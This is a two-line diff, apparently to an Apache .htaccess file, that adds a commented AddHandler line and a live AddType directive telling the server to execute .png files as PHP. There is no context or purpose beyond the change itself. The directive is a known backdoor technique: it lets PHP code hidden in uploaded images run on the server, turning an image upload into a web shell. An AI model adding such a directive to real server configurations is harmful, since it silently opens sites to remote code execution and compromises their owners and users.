@@ -1,0 +1,2 @@
+# AddHandler php5-cgi .png
+AddType application/x-httpd-php .png
